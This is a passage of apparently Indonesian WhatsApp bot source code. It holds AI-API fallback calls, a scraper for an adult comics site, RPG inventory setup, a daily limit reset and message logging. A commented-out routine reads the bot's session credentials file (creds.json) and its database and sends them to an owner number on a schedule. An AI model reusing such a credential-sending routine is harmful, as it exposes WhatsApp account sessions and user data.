            url: "https://vihangayt.me/tools/chatgpt3?q=",
            processResponse: (data) => {
                if (data.data !== 'error' && data.data !== '' && data.data !== undefined) {
                    return data.data;
                }
                return null;
            }
        },
        {
            url: "https://api.akuari.my.id/ai/gpt?chat=",
            processResponse: (data) => {
                if (data.respon !== 'error' && data.respon !== '' && data.respon !== undefined) {
                    return data.respon;
                }
                return null;
            }
        },
        {
            url: "https://api.azz.biz.id/api/bard?q=",
            processResponse: (data) => {
                if (data.respon !== 'error' && data.respon !== '' && data.respon !== undefined) {
                    return data.respon;
                }
                return null;
            }
        },
        // Add more endpoints with the appropriate processResponse functions
    ];

    for (const endpoint of apiEndpoints) {
        try {
            const response = await fetch(`${endpoint.url}${input}`);
            if (response.ok) {
                const responseData = await response.json();
                if (responseData) {
                    const processedResult = endpoint.processResponse(responseData);
                    if (processedResult) {
                        result.result = processedResult.trim();
                        return result;
                    }
                }
            }
        } catch (error) {
            console.error(error)
        }
    }

    result.status = false;
    result.result = "Error";
    return result;
}

function getDoujin(identifier) {
        const id = identifier.replace(urlToId, '$2');
        return new Promise((resolve, reject) => {
            request
                .get('https://nhentai.net/g/' + id + '/')
                .then(res => {
                    const $ = cheerio.load(res.text);
                    let details = {};
                    $('.tag-container.field-name').find('.count').each(function () {
                        const el = $(this);
                        el.text(` (${el.text()}) `);
                    });
                    $('.tag-container.field-name').text().split('\n').map(string => string.trim()).filter(u => u).map((tag, i, tags) => {
                        if (tag.endsWith(':') && !tags[i + 1].endsWith(':')) {
                            details[tag.substring(0, tag.length - 1).toLowerCase()] = tags[i + 1].replace(tagSpacerPatternn, '$1 $2').split(tagSplitPattern);
                        }
                    });
                    const title = $('#info').find('h1').text();
                    const nativeTitle = $('#info').find('h2').text();
                    const thumbnails = Object.entries($('.gallerythumb').find('img')).map(image => {
                        return image[1].attribs
                            ? image[1].attribs['data-src']
                            : null;
                    }).filter(link => link);
                    const images = Object.entries($('.gallerythumb').find('img')).map(image => {
                        return image[1].attribs
                            ? image[1].attribs['data-src'].replace(/t(\.(jpg|png|gif))/, '$1').replace('t.nhentai', 'i.nhentai')
                            : null;
                    }).filter(link => link);
                    const link = `https://nhentai.net/g/${id}/`;
                    resolve({ title, nativeTitle, details, pages: images, thumbnails, link });
                })
                .catch(reject);
        });
    }
    
function isUrl(string) {
	try {
		new URL(string);
		return true;
	} catch (err) {
		return false;
	}
}

function niceBytes(x) {
	let units = ['bytes', 'KB', 'MB', 'GB', 'TB', 'PB', 'EB', 'ZB', 'YB'];
	let l = 0, n = parseInt(x, 10) || 0;
	while(n >= 1024 && ++l){
		n = n/1024;
	}
	return(n.toFixed(n < 10 && l > 0 ? 1 : 0) + ' ' + units[l]);
}

//=======[ A N T I | S P A M ]=======//
/*ResetSpam(yang_spam);

const spampm = () => {
  console.log(color('~> [SPAM]', 'red'), color(moment(mek.messageTimestamp * 1000).format('DD/MM/YY HH:mm:ss'), 'yellow'), color(`${command} [${args.length}]`), 'from', color(pushname));
  addSpam(m.sender, yang_spam);
  m.reply('Kamu terdeteksi spam bot tanpa jeda, lakukan perintah setelah 3 detik');
};

const spamgr = () => {
  console.log(color('~> [SPAM]', 'red'), color(moment(mek.messageTimestamp * 1000).format('DD/MM/YY HH:mm:ss'), 'yellow'), color(`${command} [${args.length}]`), 'from', color(pushname), 'in', color(groupName));
  addSpam(m.sender, yang_spam);
  m.reply('Kamu terdeteksi spam bot tanpa jeda, lakukan perintah setelah 3 detik');
};

if (isCmd && isFiltered(m.sender) && !m.isGroup) spampm();
if (isCmd && isFiltered(m.sender) && m.isGroup) spamgr();
if (isCmd && args.length < 1 && !isCreator) addFilter(m.sender);*/

//=======[ L O A D | D A T A B A S E ]=======//
if (global.db.data == null)
await global.loadDatabase();
//==============================================================//

//Automation Send Database To Owner
/*const sendDatabase = async () => {
  console.log('[!] Wait, sending database...');
  try {
    await HuBotZ.sendMessage(`${setting.ownerNumber}`, { document: fs.readFileSync('./database/database.json'), fileName: 'database.json', mimetype: 'application/json' }, { quoted: m });
    await HuBotZ.sendMessage(`${setting.ownerNumber}`, { document: await fs.readFileSync('./sessions/creds.json'), fileName: 'creds.json', mimetype: 'application/json' }, { quoted: m });
    console.log('Database sent successfully.');
  } catch (e) {
    console.error(e);
    m.reply('Terjadi kesalahan, cek logs.');
  }
};*/

//schedule.scheduleJob('*/30 * * * *', sendDatabase);

//sendDatabase();

const isNumber = x => typeof x === 'number' && !isNaN(x)
//=======[ C H A T | U S E R ]=======//
try {
let chats = db.data.chats[m.chat]
if (m.chat.endsWith('@g.us')) {
if (typeof chats !== 'object') db.data.chats[m.chat] = {}
if (chats) {
if (!('goodbye' in chats)) chats.goodbye = global.auto_leaveMsg
if (!('welcome' in chats)) chats.welcome = global.auto_welcomeMsg
if (!('autosimi' in chats)) chats.autosimi = false
if (!("isBanned" in chats)) chats.isBanned = false
if (!('permaBan' in chats)) chats.permaBan = false
if (!isNumber(chats.spamcount)) chats.spamcount = 0
if (!isNumber(chats.lastmute)) chats.lastmute = 0
if (!isNumber(chats.mutecd)) chats.mutecd = 0
} else db.data.chats[m.chat] = {
goodbye: global.auto_leaveMsg, 
welcome: global.auto_welcomeMsg,
autosimi: false,
isBanned: false,
permaBan: false,
lastmute: 0,
mutecd: 0,
spamcount: 0,
}
}
} catch (e) {
console.log(e)
}
//=======[ U S E R | D A T A B A S E ]=======//
try {
m.exp = 0
try {
let limitUser = isPremium ? global.limitawal.premium : global.limitawal.free
let Gamelimit = isPremium ? global.limitgameawal.premium : global.limitgameawal.free
const user = db.data.users[m.sender]
if (typeof user !== 'object') db.data.users[m.sender] = {}
if (user) {
if (!("banned" in user)) user.banned = false
if (!("BannedReason" in user)) user.BannedReason = ""
if (!("registered" in user)) user.registered = false
if (!('permaban' in user)) user.permaban = false

//User Registered
if (!user.registered) {
if (!("name" in user)) user.name = pushname
if (!isNumber(user.limit)) user.limit = limitUser
if (!isNumber(user.glimit)) user.glimit = Gamelimit
if (!isNumber(user.age)) user.age = -1
if (!isNumber(user.regTime)) user.regTime = -1
}

//User Inv
if (!isNumber(user.health)) user.health = 100
if (!isNumber(user.money)) user.money = 0
if (!isNumber(user.exp)) user.exp = 0
if (!isNumber(user.level)) user.level = 0
if (!isNumber(user.potion)) user.potion = 0

                    //========== Ore Materials ==========\\
//Iron
if (!isNumber(user.ironnugget)) user.ironnugget = 0
if (!isNumber(user.iron)) user.iron = 0

//Gold
if (!isNumber(user.goldnugget)) user.goldnugget = 0
if (!isNumber(user.gold)) user.gold = 0

//Diamond
if (!isNumber(user.diamond)) user.diamond = 0

//Emerald
if (!isNumber(user.emerald)) user.emerald = 0

//Coal
if (!isNumber(user.coal)) user.coal = 0

//Stone
if (!isNumber(user.stone)) user.stone = 0
if (!isNumber(user.cobblestone)) user.cobblestone = 0

//Natural Materials
if (!isNumber(user.leather)) user.leather = 0
if (!isNumber(user.stick)) user.stick = 0
if (!isNumber(user.planks)) user.planks = 0
if (!isNumber(user.kayu)) user.kayu = 0
if (!isNumber(user.string)) user.string = 0
if (!isNumber(user.steel)) user.steel = 0
if (!isNumber(user.kargo)) user.kargo = 0
if (!isNumber(user.kapal)) user.kapal = 0

//User Armor
        //Helmet
if (!isNumber(user.leatherhelmet)) user.leatherhelmet = 0
if (!isNumber(user.leatherhelmetdurability)) user.leatherhelmetdurability = 0
if (!isNumber(user.chainmailhelmet)) user.chainmailhelmet = 0
if (!isNumber(user.chainmailhelmetdurability)) user.chainmailhelmetdurability = 0
if (!isNumber(user.ironhelmet)) user.ironhelmet = 0
if (!isNumber(user.ironhelmetdurability)) user.ironhelmetdurability = 0
if (!isNumber(user.goldhelmet)) user.goldhelmet = 0
if (!isNumber(user.goldhelmetdurability)) user.goldhelmetdurability = 0
if (!isNumber(user.diamondhelmet)) user.diamondhelmet = 0
if (!isNumber(user.diamondhelmetdurability)) user.diamondhelmetdurability = 0

        //Chestplate
if (!isNumber(user.leatherchestplate)) user.leatherchestplate = 0
if (!isNumber(user.leatherchestplatedurability)) user.leatherchestplatedurability = 0
if (!isNumber(user.chainmailchestplate)) user.chainmailchestplate = 0
if (!isNumber(user.chainmailchestplatedurability)) user.chainmailchestplatedurability = 0
if (!isNumber(user.ironchestplate)) user.ironchestplate = 0
if (!isNumber(user.ironchestplatedurability)) user.ironchestplatedurability = 0
if (!isNumber(user.goldchestplate)) user.goldchestplate = 0
if (!isNumber(user.goldchestplatedurability)) user.goldchestplatedurability = 0
if (!isNumber(user.diamondchestplate)) user.diamondchestplate = 0
if (!isNumber(user.diamondchestplatedurability)) user.diamondchestplatedurability = 0

        //Leggings
if (!isNumber(user.leatherleggings)) user.leatherleggings = 0
if (!isNumber(user.leatherleggingsdurability)) user.leatherleggingsdurability = 0
if (!isNumber(user.chainmailleggings)) user.chainmailleggings = 0
if (!isNumber(user.chainmailleggingsdurability)) user.chainmailleggingsdurability = 0
if (!isNumber(user.ironleggings)) user.ironleggings = 0
if (!isNumber(user.ironleggingsdurability)) user.ironleggingsdurability = 0
if (!isNumber(user.goldleggings)) user.goldleggings = 0
if (!isNumber(user.goldleggingsdurability)) user.goldleggingsdurability = 0
if (!isNumber(user.diamondleggings)) user.diamondleggings = 0
if (!isNumber(user.diamondleggingsdurability)) user.diamondleggingsdurability = 0

        //Boots
if (!isNumber(user.leatherboots)) user.leatherboots = 0
if (!isNumber(user.leatherbootsdurability)) user.leatherbootsdurability = 0
if (!isNumber(user.chainmailboots)) user.chainmailboots = 0
if (!isNumber(user.chainmailbootsdurability)) user.chainmailbootsdurability = 0
if (!isNumber(user.ironboots)) user.ironboots = 0
if (!isNumber(user.ironbootsdurability)) user.ironbootsdurability = 0
if (!isNumber(user.goldboots)) user.goldboots = 0
if (!isNumber(user.goldbootsdurability)) user.goldbootsdurability = 0
if (!isNumber(user.diamondboots)) user.diamondboots = 0
if (!isNumber(user.diamondbootsdurability)) user.diamondbootsdurability = 0

//User Tools
                        //Wood Tools
if (!isNumber(user.woodpick)) user.woodpick = 0
if (!isNumber(user.woodpickdurability)) user.woodpickdurability = 0
if (!isNumber(user.woodaxe)) user.woodaxe = 0
if (!isNumber(user.woodaxedurability)) user.woodaxedurability = 0
if (!isNumber(user.woodsword)) user.woodsword = 0
if (!isNumber(user.woodsworddurability)) user.woodsworddurability = 0
if (!isNumber(user.woodshovel)) user.woodshovel = 0
if (!isNumber(user.woodshoveldurability)) user.woodshoveldurability = 0
if (!isNumber(user.woodhoe)) user.woodhoe = 0
if (!isNumber(user.woodhoedurability)) user.woodhoedurability = 0

                        //Stone Tools
if (!isNumber(user.stonepick)) user.stonepick = 0
if (!isNumber(user.stonepickdurability)) user.stonepickdurability = 0
if (!isNumber(user.stoneaxe)) user.stoneaxe = 0
if (!isNumber(user.stoneaxedurability)) user.stoneaxedurability = 0
if (!isNumber(user.stonesword)) user.stonesword = 0
if (!isNumber(user.stonesworddurability)) user.stonesworddurability = 0
if (!isNumber(user.stoneshovel)) user.stoneshovel = 0
if (!isNumber(user.stoneshoveldurability)) user.stoneshoveldurability = 0
if (!isNumber(user.stonehoe)) user.stonehoe = 0
if (!isNumber(user.stonehoedurability)) user.stonehoedurability = 0

                        //Iron Tools
if (!isNumber(user.ironpick)) user.ironpick = 0
if (!isNumber(user.ironpickdurability)) user.ironpickdurability = 0
if (!isNumber(user.ironaxe)) user.ironaxe = 0
if (!isNumber(user.ironaxedurability)) user.ironaxedurability = 0
if (!isNumber(user.ironsword)) user.ironsword = 0
if (!isNumber(user.ironsworddurability)) user.ironsworddurability = 0
if (!isNumber(user.ironshovel)) user.ironshovel = 0
if (!isNumber(user.ironshoveldurability)) user.ironshoveldurability = 0
if (!isNumber(user.ironhoe)) user.ironhoe = 0
if (!isNumber(user.ironhoedurability)) user.ironhoedurability = 0

                        //Gold Tools
if (!isNumber(user.goldpick)) user.goldpick = 0
if (!isNumber(user.goldpickdurability)) user.goldpickdurability = 0
if (!isNumber(user.goldaxe)) user.goldaxe = 0
if (!isNumber(user.goldaxedurability)) user.goldaxedurability = 0
if (!isNumber(user.goldsword)) user.goldsword = 0
if (!isNumber(user.goldsworddurability)) user.goldsworddurability = 0
if (!isNumber(user.goldshovel)) user.goldshovel = 0
if (!isNumber(user.goldshoveldurability)) user.goldshoveldurability = 0
if (!isNumber(user.goldhoe)) user.goldhoe = 0
if (!isNumber(user.goldhoedurability)) user.goldhoedurability = 0

                        //Diamond Tools
if (!isNumber(user.diamondpick)) user.diamondpick = 0
if (!isNumber(user.diamondpickdurability)) user.diamondpickdurability = 0
if (!isNumber(user.diamondaxe)) user.diamondaxe = 0
if (!isNumber(user.diamondaxedurability)) user.diamondaxedurability = 0
if (!isNumber(user.diamondsword)) user.diamondsword = 0
if (!isNumber(user.diamondsworddurability)) user.diamondsworddurability = 0
if (!isNumber(user.diamondshovel)) user.diamondshovel = 0
if (!isNumber(user.diamondshoveldurability)) user.diamondshoveldurability = 0
if (!isNumber(user.diamondhoe)) user.diamondhoe = 0
if (!isNumber(user.diamondhoedurability)) user.diamondhoedurability = 0

//User Crafting Count
if (!isNumber(user.craftcount)) user.craftcount = 0

//Animals
if (!isNumber(user.ikan)) user.ikan = 0
if (!isNumber(user.ayam)) user.ayam = 0
if (!isNumber(user.kelinci)) user.kelinci = 0
if (!isNumber(user.domba)) user.domba = 0
if (!isNumber(user.sapi)) user.sapi = 0
if (!isNumber(user.gajah)) user.gajah = 0
if (!isNumber(user.cat)) user.cat = 0

//user's last activity
if (!('laststarterclaim' in user)) user.laststarterclaim = false
if (!isNumber(user.reglast)) user.reglast = 0
if (!isNumber(user.unreglast)) user.unreglast = 0
if (!isNumber(user.lastcodereg)) user.lastcodereg = 0
if (!isNumber(user.claimlimit)) user.claimlimit = 0
if (!isNumber(user.lastclaim)) user.lastclaim = 0
if (!isNumber(user.lastweekly)) user.lastweekly = 0
if (!isNumber(user.lastmonthly)) user.lastmonthly = 0
if (!isNumber(user.lastfishing)) user.lastfishing = 0
if (!isNumber(user.lastmining)) user.lastmining = 0
if (!isNumber(user.lastmulung)) user.lastmulung = 0
if (!isNumber(user.lastjelajah)) user.lastjelajah = 0
if (!isNumber(user.lastadventure)) user.lastadventure = 0
if (!isNumber(user.lastngojek)) user.lastngojek = 0
if (!isNumber(user.lasthunt)) user.lasthunt = 0
if (!isNumber(user.lastmeroket)) user.lastmeroket = 0
if (!isNumber(user.lastluck)) user.lastluck = 0
if (!isNumber(user.lastkillslime)) user.lastkillslime = 0
if (!isNumber(user.lastkillgoblin)) user.lastkillgoblin = 0
if (!isNumber(user.lastkilldevil)) user.lastkilldevil = 0
if (!isNumber(user.lastkillbehemoth)) user.lastkillbehemoth = 0
if (!isNumber(user.lastkilldemon)) user.lastkilldemon = 0
if (!isNumber(user.lastkilldemonking)) user.lastkilldemonking = 0
} else db.data.users[m.sender] = {

//User Registered
banned: false,
BannedReason: "",
registered: false,
limit: limitUser,
glimit: Gamelimit,
reglast: 0,
unreglast: 0,
lastcodereg: 0,
regTime: -1,
name: pushname,
age: -1,
                    
//User Inv
health: 100,
money: 0,
exp: 0,
level: 0,
potion: 0,

//Ore Materials
ironnugget: 0,
iron: 0,
goldnugget: 0,
gold: 0,
diamond: 0,
emerald: 0,
coal: 0,
stone: 0,
cobblestone: 0,

//Natural Materials
leather: 0,
stick: 0,
planks: 0,
kayu: 0,
string: 0,
steel: 0,
kargo: 0,
kapal: 0,

            //User Armor
        //Helmet
leatherhelmet: 0,
leatherhelmetdurability: 0,
//===
chainmailhelmet: 0,
chainmailhelmetdurability: 0,
//===
ironhelmet: 0,
ironhelmetdurability: 0,
//===
goldhelmet: 0,
goldhelmetdurability: 0,
//===
diamondhelmet: 0,
diamondhelmetdurability: 0,

        //Chestplate
leatherchestplate: 0,
leatherchestplatedurability: 0,
//===
chainmailchestplate: 0,
chainmailchestplatedurability: 0,
//===
ironchestplate: 0,
ironchestplatedurability: 0,
//===
goldchestplate: 0,
goldchestplatedurability: 0,
//===
diamondchestplate: 0,
diamondchestplatedurability: 0,

        //Leggings
leatherleggings: 0,
leatherleggingsdurability: 0,
//===
chainmailleggings: 0,
chainmailleggingsdurability: 0,
//===
ironleggings: 0,
ironleggingsdurability: 0,
//===
goldleggings: 0,
goldleggingsdurability: 0,
//===
diamondleggings: 0,
diamondleggingsdurability: 0,

        //Boots
leatherboots: 0,
leatherbootsdurability: 0,
//===
chainmailboots: 0,
chainmailbootsdurability: 0,
//===
ironboots: 0,
ironbootsdurability: 0,
//===
goldboots: 0,
goldbootsdurability: 0,
//===
diamondboots: 0,
diamondbootsdurability: 0,

            //User Tools
//Wood Tools
woodpick: 0,
woodpickdurability: 0,
woodaxe: 0,
woodaxedurability: 0,
woodsword: 0,
woodsworddurability: 0,
woodshovel: 0,
woodshoveldurability: 0,
woodhoe: 0,
woodhoedurability: 0,

//Stone Tools
stonepick: 0,
stonepickdurability: 0,
stoneaxe: 0,
stoneaxedurability: 0,
stonesword: 0,
stonesworddurability: 0,
stoneshovel: 0,
stoneshoveldurability: 0,
stonehoe: 0,
stonehoedurability: 0,

//Gold Tools
goldpick: 0,
goldpickdurability: 0,
goldaxe: 0,
goldaxedurability: 0,
goldsword: 0,
goldsworddurability: 0,
goldshovel: 0,
goldshoveldurability: 0,
goldhoe: 0,
goldhoedurability: 0,

//Iron Tools
ironpick: 0,
ironpickdurability: 0,
ironaxe: 0,
ironaxedurability: 0,
ironsword: 0,
ironsworddurability: 0,
ironshovel: 0,
ironshoveldurability: 0,
ironhoe: 0,
ironhoedurability: 0,

//Diamond Tools
diamondpick: 0,
diamondpickdurability: 0,
diamondaxe: 0,
diamondaxedurability: 0,
diamondsword: 0,
diamondsworddurability: 0,
diamondshovel: 0,
diamondshoveldurability: 0,
diamondhoe: 0,
diamondhoedurability: 0,

//User Craft Count
craftcount: 0,

//User Animals
ikan: 0,
ayam: 0,
kelinci: 0,
domba: 0,
sapi: 0,
gajah: 0,
cat: 0,

//user's last activity
laststarterclaim: false,
lastclaimlimit: 0,
lastclaim: 0,
lastweekly: 0,
lastmonthly: 0,
lastfishing: 0,
lastmining: 0,
lastmulung: 0,
lastjelajah: 0,
lastadventure: 0,
lastngojek: 0,
lasthunt: 0,
lastmeroket: 0,
lastluck: 0,
lastkillslime: 0,
lastkillgoblin: 0,
lastkilldevil: 0,
lastkillbehemoth: 0,
lastkilldemon: 0,
lastkilldemonking: 0,

//User System
permaban: 0,
}
} catch (e) {
console.log(e)
}
if (m.isBaileys) return
m.exp += Math.ceil(Math.random() * 10)
} catch (e) {
console.log(e)
} finally {
let user, stats = db.data.stats
if (m.sender && (user = db.data.users[m.sender])) {
user.exp += m.exp
}
}

// Auto Reset Limit
const cron = require('node-cron');

// Assuming you have the 'isPremium' variable available in the scope

// Auto Reset Limit
cron.schedule('0 12 * * *', () => {
    let userIDs = Object.keys(db.data.users);
    let limitUser = isPremium ? global.limitawal.premium : global.limitawal.free;
    let gamelimit = isPremium ? global.limitgameawal.premium : global.limitgameawal.free;
    for (let userID of userIDs) {
        db.data.users[userID].limit = limitUser;
        db.data.users[userID].glimit = gamelimit;
    }
    console.log('Reseted Limit and Game Limit');
    HuBotZ.sendText("6281383141734@whatsapp.net", {
    text: 'Reseted Limit And Game Limit Users'
    })
}, {
    scheduled: true,
    timezone: "Asia/Jakarta"
});

//==============================================================//
//=======[  U S E R | R O L E ]=======//
  let user = db.data.users[m.sender]
        let role = (user.level <= 2) ? 'Newbie ㋡'
          : ((user.level >= 2) && (user.level <= 4)) ? 'Beginner Grade 1 ⚊¹'
          : ((user.level >= 4) && (user.level <= 6)) ? 'Beginner Grade 2 ⚊²'
          : ((user.level >= 6) && (user.level <= 8)) ? 'Beginner Grade 3 ⚊³'
          : ((user.level >= 8) && (user.level <= 10)) ? 'Beginner Grade 4 ⚊⁴'
          : ((user.level >= 10) && (user.level <= 20)) ? 'Private Grade 1 ⚌¹'
          : ((user.level >= 20) && (user.level <= 30)) ? 'Private Grade 2 ⚌²'
          : ((user.level >= 30) && (user.level <= 40)) ? 'Private Grade 3 ⚌³'
          : ((user.level >= 40) && (user.level <= 50)) ? 'Private Grade 4 ⚌⁴'
          : ((user.level >= 50) && (user.level <= 60)) ? 'Private Grade 5 ⚌⁵'
          : ((user.level >= 60) && (user.level <= 70)) ? 'Corporal Grade 1 ☰¹' 
          : ((user.level >= 70) && (user.level <= 80)) ? 'Corporal Grade 2 ☰²' 
          : ((user.level >= 80) && (user.level <= 90)) ? 'Corporal Grade 3 ☰³' 
          : ((user.level >= 90) && (user.level <= 100)) ? 'Corporal Grade 4 ☰⁴' 
          : ((user.level >= 100) && (user.level <= 110)) ? 'Corporal Grade 5 ☰⁵'
          : ((user.level >= 110) && (user.level <= 120)) ? 'Sergeant Grade 1 ≣¹'
          : ((user.level >= 120) && (user.level <= 130)) ? 'Sergeant Grade 2 ≣²'
          : ((user.level >= 130) && (user.level <= 140)) ? 'Sergeant Grade 3 ≣³'
          : ((user.level >= 140) && (user.level <= 150)) ? 'Sergeant Grade 4 ≣⁴'
          : ((user.level >= 150) && (user.level <= 160)) ? 'Sergeant Grade 5 ≣⁵' 
          : ((user.level >= 160) && (user.level <= 170)) ? 'Staff Grade 1 ﹀¹' 
          : ((user.level >= 170) && (user.level <= 180)) ? 'Staff Grade 2 ﹀²' 
          : ((user.level >= 180) && (user.level <= 190)) ? 'Staff Grade 3 ﹀³' 
          : ((user.level >= 190) && (user.level <= 200)) ? 'Staff Grade 4 ﹀⁴' 
          : ((user.level >= 200) && (user.level <= 210)) ? 'Staff Grade 5 ﹀⁵' 
          : ((user.level >= 210) && (user.level <= 220)) ? 'Sergeant Grade 1 ︾¹'
          : ((user.level >= 220) && (user.level <= 230)) ? 'Sergeant Grade 2 ︾²'
          : ((user.level >= 230) && (user.level <= 240)) ? 'Sergeant Grade 3 ︾³'
          : ((user.level >= 240) && (user.level <= 250)) ? 'Sergeant Grade 4 ︾⁴'
          : ((user.level >= 250) && (user.level <= 260)) ? 'Sergeant Grade 5 ︾⁵'
          : ((user.level >= 260) && (user.level <= 270)) ? '2nd Lt. Grade 1 ♢¹'
          : ((user.level >= 270) && (user.level <= 280)) ? '2nd Lt. Grade 2 ♢²'  
          : ((user.level >= 280) && (user.level <= 290)) ? '2nd Lt. Grade 3 ♢³' 
          : ((user.level >= 290) && (user.level <= 300)) ? '2nd Lt. Grade 4 ♢⁴' 
          : ((user.level >= 300) && (user.level <= 310)) ? '2nd Lt. Grade 5 ♢⁵'
          : ((user.level >= 310) && (user.level <= 320)) ? '1st Lt. Grade 1 ♢♢¹'
          : ((user.level >= 320) && (user.level <= 330)) ? '1st Lt. Grade 2 ♢♢²'
          : ((user.level >= 330) && (user.level <= 340)) ? '1st Lt. Grade 3 ♢♢³'
          : ((user.level >= 340) && (user.level <= 350)) ? '1st Lt. Grade 4 ♢♢⁴'
          : ((user.level >= 350) && (user.level <= 360)) ? '1st Lt. Grade 5 ♢♢⁵'
          : ((user.level >= 360) && (user.level <= 370)) ? 'Major Grade 1 ✷¹'
          : ((user.level >= 370) && (user.level <= 380)) ? 'Major Grade 2 ✷²'
          : ((user.level >= 380) && (user.level <= 390)) ? 'Major Grade 3 ✷³'
          : ((user.level >= 390) && (user.level <= 400)) ? 'Major Grade 4 ✷⁴'
          : ((user.level >= 400) && (user.level <= 410)) ? 'Major Grade 5 ✷⁵'
          : ((user.level >= 410) && (user.level <= 420)) ? 'Colonel Grade 1 ✷✷¹'
          : ((user.level >= 420) && (user.level <= 430)) ? 'Colonel Grade 2 ✷✷²'
          : ((user.level >= 430) && (user.level <= 440)) ? 'Colonel Grade 3 ✷✷³'
          : ((user.level >= 440) && (user.level <= 450)) ? 'Colonel Grade 4 ✷✷⁴'
          : ((user.level >= 450) && (user.level <= 460)) ? 'Colonel Grade 5 ✷✷⁵'
          : ((user.level >= 460) && (user.level <= 470)) ? 'Brigadier Early ✰'
          : ((user.level >= 470) && (user.level <= 480)) ? 'Brigadier Silver ✩'
          : ((user.level >= 480) && (user.level <= 490)) ? 'Brigadier gold ✯' 
          : ((user.level >= 490) && (user.level <= 500)) ? 'Brigadier Platinum ✬'
          : ((user.level >= 500) && (user.level <= 600)) ? 'Brigadier Diamond ✪'
          : ((user.level >= 600) && (user.level <= 700)) ? 'Legendary 忍'
          : ((user.level >= 700) && (user.level <= 800)) ? 'Legendary 忍忍'
          : ((user.level >= 800) && (user.level <= 900)) ? 'Legendary 忍忍忍'
          : ((user.level >= 900) && (user.level <= 1000)) ? 'Legendary忍忍忍忍'
          : 'Master 숒 × Legendary 숒'
  user.role = role
//==============================================================//

// Push Message To Console
        if (m.message && m.isGroup) {
            HuBotZ.readMessages([m.key])
            console.log(color(`\n< =+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+ >\n`, 'yellow'))
			console.log(color(`Group Chat:`, 'white'))
            console.log(chalk.black(chalk.bgWhite('📄 PESAN')), chalk.black(chalk.bgGreen(new Date)), chalk.black(chalk.bgYellow(budy || m.mtype)) + '\n' + chalk.magenta('👤 DARI'), chalk.cyan(pushname), chalk.yellow(m.sender) + '\n' + chalk.redBright('👥 GRUP'), chalk.green(groupName, m.chat))
        } else {
            HuBotZ.readMessages([m.key])
            console.log(color(`\n< ================================================== >\n`, 'yellow'))
			console.log(color(`Private Chat:`, 'white'))
            console.log(chalk.black(chalk.bgWhite('📄 PESAN')), chalk.black(chalk.bgGreen(new Date)), chalk.black(chalk.bgYellow(budy || m.mtype)) + '\n' + chalk.magenta('👤 DARI'), chalk.cyan(pushname), chalk.green(m.sender))
        }

_sewa.expiredCheck(HuBotZ, sewa)
_prem.expiredCheck(HuBotZ, premium)

setInterval(() => {
for (let i of Object.values(opengc)) {
if (Date.now() >= i.time) {
HuBotZ.groupSettingUpdate(i.id, "not_announcement")
.then((res) =>
HuBotZ.sendMessage(i.id, { text: `Sukses, group telah dibuka` }))
.catch((err) =>
HuBotZ.sendMessage(i.id, { text: 'Error' }))
delete opengc[i.id]
fs.writeFileSync('./database/opengc.json', JSON.stringify(opengc))
}
}
}, 1000)

//=======[ P U B L I C ]=======//
const public = global.public
//==\\
if (!public) {
if (!m.key.fromMe && !isCreator) return
}

//Banned Chat
if (m.isGroup && isBanchat) {
if (!m.key.fromMe && !isCreator) return 
}
// auto set bio
if (global.autobio){
if (global.autobio === false) return
let settingstatus = 0;
if (new Date() * 1 - settingstatus > 1000) {
await HuBotZ.setStatus(`I'm ${HuBotZ.user.name} 🤖 | ${runtime(process.uptime())} ⏰ | Status : ${HuBotZ.mode ? "Public Mode" : "Self Mode"} | ${user.length} Users`)
settingstatus = new Date() * 1
}
}
if (!isCreator && global.grupOnly && !m.isGroup){
return
}
if (!isCreator && global.japriOnly && m.isGroup){
return
}
//Reply
const replygcHuBotZ = (teks) => {
HuBotZ.sendMessage(m.chat,
{ text: teks,
contextInfo:{
mentionedJid:[m.sender],
"externalAdReply": {
"showAdAttribution": true,
"containsAutoReply": true,
"title": ` ${global.botname}`,
"body": `${jam}`,
"previewType": "PHOTO",
"thumbnailUrl": ``,
"thumbnail": fs.readFileSync(`./theme/jembot.jpg`),
"sourceUrl": `${global.wagc}`}}},
{ quoted: m})
}

const reply = (teks) => {
HuBotZ.sendMessage(m.chat, { text: teks ,
contextInfo:{
forwardingScore: 9999999, 
isForwarded: true
}
}, { quoted : m })
}

//ReadMore
const more = String.fromCharCode(8206)
const readMore = more.repeat(4201)

//Send Sticker
const sendSticker = (pesan) => {
HuBotZ.sendImageAsSticker(m.chat, pesan, m, {
 packname: `Created By ${global.botname}\n${tanggal(new Date())}`, 
 author: `Owner ${global.ownername}\nTime ${time}`
 })
}

try {
ppuser = await HuBotZ.profilePictureUrl(m.sender, 'image')
} catch (err) {
ppuser = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
}
defaultpp = await getBuffer(ppuser)
/////
var bodynyaui = (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ""
 for (let BotZ of stiker) {
	if (!bodynyaui && budy === BotZ) {
		result = fs.readFileSync(`./database/${BotZ}.webp`)
		await HuBotZ.sendStickerFromUrl(m.chat, result, m, {
		packname: `Created By ${global.botname}\n${tanggal(new Date())}`, 
		author: `Owner ${global.ownername}\nTime ${jam}`
		})
		}
		}
for (let BotZz of audionya){
if (!bodynyaui && budy === BotZz){
result = fs.readFileSync(`./database/${BotZ}.mp3`)
HuBotZ.sendAudio(m.chat, result, m, true)
}
}
for (let BotZzz of imagenya){
if (!bodynyaui && budy === BotZzz){
result = fs.readFileSync(`./database/${BotZzz}.jpg`)
HuBotZ.sendImage(m.chat, result, '', m)
}
}
for (let BotZzzz of videonye){
if (!bodynyaui && budy === BotZzzz){
result = fs.readFileSync(`./database/${BotZzzz}.mp4`)
HuBotZ.sendVideo(m.chat, result, false, "",m)
}
}
async function addCountCmdUser(nama, sender, u) {
var posi = null
var pos = null
Object.keys(u).forEach((i) => {
if (u[i].jid === sender) {
posi = i
}
})
if (posi === null) {
u.push({jid: m.sender, db: [{nama: nama, count: 0}]})
fs.writeFileSync('./database/commandUser.json', JSON.stringify(u, null, 2));
Object.keys(u).forEach((i) => {
if (u[i].jid === m.sender) {
posi = i
}
})
}
if (posi !== null) {
Object.keys(u[posi].db).forEach((i) => {
if (u[posi].db[i].nama === nama) {
pos = i
}
})
if (pos === null) {
u[posi].db.push({nama: nama, count: 1})
fs.writeFileSync('./database/commandUser.json', JSON.stringify(u, null, 2));
} else {
u[posi].db[pos].count += 1
